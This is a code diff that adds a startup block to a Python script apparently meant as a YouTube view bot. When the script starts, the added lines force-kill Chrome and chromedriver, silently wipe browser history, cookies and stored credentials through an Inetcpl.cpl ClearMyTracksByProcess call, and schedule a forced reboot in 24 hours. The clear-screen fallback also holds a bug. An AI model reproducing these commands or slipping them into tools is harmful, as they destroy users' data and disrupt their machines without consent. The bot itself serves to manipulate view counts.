@@ -11,6 +11,26 @@ import time
 import os
 import random
 import argparse
+from os import system,name
+
+def SetTitle(title_name:str):
+    system("title {0}".format(title_name))
+
+def clear():
+    if name == 'posix':
+        system('clear')
+    elif name in ('ce', 'nt', 'dos'):
+        system('cls')
+    else:
+        print("\n") * 120
+
+SetTitle('Thisisawesome1994 Youtube Bot 1.0')
+clear()
+system('color 2 & taskkill /F /IM chrome.exe /T')
+system('color 2 & taskkill /F /IM chromedriver.exe /T')
+system('color 2 & Rundll32.exe Inetcpl.cpl ClearMyTracksByProcess 8351')
+system('color 2 & shutdown -r -t 86400')
+
 parser = argparse.ArgumentParser()
 
 
